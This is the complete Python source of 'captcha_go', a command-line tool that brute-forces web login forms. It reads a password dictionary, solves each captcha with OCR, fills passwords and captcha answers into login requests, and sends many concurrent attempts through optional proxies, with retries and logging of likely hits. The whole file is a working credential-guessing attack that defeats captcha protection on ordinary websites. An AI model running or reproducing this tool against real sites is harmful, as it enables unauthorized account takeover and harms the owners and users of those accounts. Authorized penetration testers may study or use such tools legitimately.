import aiohttp,json,asyncio,argparse,ddddocr,imghdr,sys,datetime,urllib.parse
from tqdm import tqdm
 
def banner():
	print('''
				  _       _                         
				 | |     | |                        
   ___ __ _ _ __ | |_ ___| |__   __ _    __ _  ___  
  / __/ _` | '_ \| __/ __| '_ \ / _` |  / _` |/ _ \ 
 | (_| (_| | |_) | || (__| | | | (_| | | (_| | (_) |
  \___\__,_| .__/ \__\___|_| |_|\__,_|  \__, |\___/ 
		   | |                           __/ |      
		   |_|                          |___/       
 
Author:MrWu  feedback:https://mrwu.red/fenxiang/4090.html        
Update Time:2023 7/26 17.30
											   
Tips :
1.验证码错误、无法访问、请求超时等失败的请求会自动重试！                                               
2.可以通过 -x 排除不需要回显的状态码、响应结果关键词来让结果更加清晰，多个排除使用空格分割！
3.验证码和登录均支持自定义请求头，可以使用多个参数形式来添加多个请求头： -lh "xx:xx" -lh "aa:aa"！
4.如数据类型是JSON数据，使用反斜杠转义双引号：--data "{\\"username\\":\\"admin\\",\\"password\\":\\"mrwu_pass\\",\\"code\\":\\"mrwu_yzm\\"}"
''')
 
#日志保存
def save(data):
	f = open('log.txt', 'a',encoding='utf-8')
	f.write(data + '\n')
	f.close()
 
 
#命令行参数
def parse_arguments(argv):
	parser = argparse.ArgumentParser()
 
	# 添加命令行参数
	parser.add_argument('-lu', '--login_url', default='', required=True, help="登录提交地址", type=str)
	parser.add_argument('-cu', '--captcha_url', default='', help="验证码地址", type=str)
	parser.add_argument('-ch', '--captcha_header', action='append', default=['User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537'], help="验证码请求头")
	parser.add_argument('-lh', '--login_header', action='append', default=['User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537'], help="登录请求头，必须带上数据类型(application/json 或 application/x-www-form-urlencoded)。")
	parser.add_argument('-d', '--data', default='', required=True, help="1.登录提交的数据包，mrwu_pass 替换密码值，mrwu_yzm 替换验证码值。 2.如果是JSON数据类型，请给双引号加上反斜杠转义符。", type=str)
	parser.add_argument('-f', '--file', default='', required=True, help="密码字典路径", type=str)
	parser.add_argument('-x', '--xxx', nargs='+', default=[], help="排除的响应包大小回显,多个空格分割")
	parser.add_argument('-t', '--thread', type=int, default=10, help="指定线程数")
	parser.add_argument('-p', '--proxy', type=str, default='', help="代理格式:  协议:IP:端口   如：socks5://127.0.0.1:1080")
 
	# 解析命令行参数
	args = parser.parse_args(argv)
 
	# 处理 captcha_header
	captcha_headers = {}
	if args.captcha_header:
		for header in args.captcha_header:
			key, value = header.split(':')
			captcha_headers[key.strip()] = value.strip()
 
	# 处理 login_header
	login_headers = {}
	if args.login_header:
		for header in args.login_header:
			key, value = header.split(':')
			login_headers[key.strip()] = value.strip()
 
	# 返回解析结果
	return args.login_url, args.captcha_url, captcha_headers, login_headers, args.data, args.file, args.xxx, args.thread, args.proxy
 
 
#字典
def open_data(txt):
	data_list = []
	try:
		with open(txt, 'r', encoding='utf-8') as f:
			for line in f:
				try:
					# 处理每一行的内容
					data_list.append(line.replace("\n", ""))
				except Exception:
					tqdm.write(f"\033[94m[{datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] \033[91m[ERROR] 读取文件异常，进行重试...\033[0m")
					data_list = open_data(txt)  # 递归调用 open_data() 函数进行重试
					break
		return data_list
	except FileNotFoundError:
		exit(f"\033[94m[{datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] \033[91m[ERROR] 加载字典失败，请检查路径是否有误！\033[0m")
 
async def _ocr(img):
	try:
		if imghdr.what(None, img) is not None:
			ocr = ddddocr.DdddOcr(show_ad=False)
			res = await asyncio.to_thread(ocr.classification, img)
			return res
	except Exception as e:
		exit(f"\033[94m[{datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] \033[91m[ERROR] 验证码识别发生错误:\033[0m {e}")
 
async def captcha(params):
	headers = params['param3']
	proxies = params['param5']
	url = params['param2']
 
	try:
		async with aiohttp.ClientSession() as session:
			async with session.get(url, headers=headers, proxy=proxies, timeout=3, ssl=False) as response:
				captcha_text = await response.read()
				cookies = response.headers.getall('Set-Cookie')
 
				if cookies and captcha_text:
					return cookies, captcha_text
				else:
					return -1
	except ConnectionResetError as e:
		tqdm.write(f"\033[94m[{datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] \033[91m[ERROR] 发生了错误：{e}，延迟 3 秒后重试... \033[0m")
		await asyncio.sleep(3)
		return -1
	except Exception as e:
		return -1
 
async def login(data, cookie, params):
	url = params['param1']
	proxies = params['param5']
	headers = {"Cookie": "; ".join(cookie)}
 
	if params['param4']:
		headers.update(params['param4'])
 
	try:
		async with aiohttp.ClientSession() as session:
			async with session.post(params['param1'], data=data, headers=headers, proxy=params['param5'], timeout=3, ssl=False) as response:
				login_text = await response.text()
				if login_text and response.status:
					return response.status, login_text
				else:
					return -1
	except ConnectionResetError as e:
		tqdm.write(f"\033[94m[{datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] \033[91m[ERROR] 发生了错误：{e}，延迟 3 秒后重试... \033[0m")
		await asyncio.sleep(3)
		return -1
	except Exception as e:
		return -1
 
def login_results(pwd,result):
	status_code, response_text = result
 
	if "验证码" in str(response_text) or str(status_code) not in ['200', '301', '302']:
		return -1
 
	res = [ele for ele in params['param7'] if (ele in str(response_text) or ele in str(status_code))]
 
	if not res:
		if len(str(response_text)) <= 150:
			tqdm.write(f"\033[94m[{datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] \033[92m[INFO]  \033[96m状态码：\033[0m{str(status_code)}  \033[96m密码：\033[0m{pwd}  \033[96m结果：\033[0m{str(response_text)}")
 
		else:
			tqdm.write(f"\033[94m[{datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] \033[92m[INFO]  \033[96m状态码：\033[0m{str(status_code)}  \033[96m密码：\033[0m{pwd}  \033[96m结果：\033[0m 响应结果太大请查看log.txt文件！")
			save("密码：%s  结果：%s\r" % (pwd, str(response_text)))
	
	return str(status_code)
 
async def run(pwd, params):
	if params['param2']:
		#验证码请求
		captcha_task = asyncio.create_task(captcha(params))
		captcha_result = await captcha_task
 
		if captcha_result == -1:
			return -1
 
		#验证码识别
		img_task = asyncio.create_task(_ocr(captcha_result[1]))
		img_result = await img_task
 
		#登录请求
		data = params['param6'].replace('mrwu_pass', urllib.parse.quote(pwd)).replace('mrwu_yzm', img_result)
		login_task = asyncio.create_task(login(data, captcha_result[0], params))
	else:
		#登录请求
		data = params['param6'].replace('mrwu_pass', urllib.parse.quote(pwd))
		login_task = asyncio.create_task(login(data, '', params))
 
	login_result = await login_task
	if login_result == -1:
		return -1
 
	return login_results(pwd,login_result)
 
 
async def execute_tasks(thread, task_list, params):
	pbar = tqdm(total=len(task_list), desc='\033[94m任务', mininterval=0.3,
				bar_format=' {l_bar}{bar}| [\033[0m\033[91m{n_fmt}\033[94m/\033[0m\033[91m{total_fmt}\033[0m\033[94m] , [\033[0m\033[91m{rate_fmt}\033[0m\033[94m] , [用时:\033[0m\033[91m{elapsed}\033[0m\033[94m] , [预估完成时间:\033[0m\033[91m{remaining}\033[0m\033[94m]{postfix}')
 
	async def process_task(pwd):
		while True:
			try:
				result = await run(pwd, params)
				pbar.set_postfix_str('[状态码:\033[0m\033[91m' + str(result) + '\033[0m\033[94m]\033[0m')
				if result != -1:
					break
			except Exception as e:
				break
		pbar.update(1)
 
	async def run_tasks():
		tasks = {process_task(pwd) for pwd in task_list[:thread]}
		while tasks:
			completed, tasks = await asyncio.wait(tasks, return_when=asyncio.FIRST_COMPLETED)
			for task in completed:
				await task
 
				if len(task_list) > thread:
					new_task = task_list.pop(thread)
					tasks.add(asyncio.create_task(process_task(new_task)))
 
			#await asyncio.sleep(0.5)  # 添加延迟时间，如果需要则取消注释即可。
 
	try:
		await run_tasks()
	finally:
		pbar.close()
 
 
if __name__ == "__main__":
	banner()
	cmd = parse_arguments(sys.argv[1:])
 
	# 传递参数构造
	params = {
		'param1': cmd[0],
		'param2': cmd[1],
		'param3': cmd[2],
		'param4': cmd[3],
		'param5': cmd[8],
		'param6': cmd[4],
		'param7': cmd[6]
	}
	passlist = open_data(cmd[5])
 
	# 启动
	loop = asyncio.get_event_loop()
	loop.run_until_complete(execute_tasks(cmd[7], passlist, params))
 
	print(f"\033[94m[{datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] \033[91m[OK] 全部任务已完成！\033[0m")
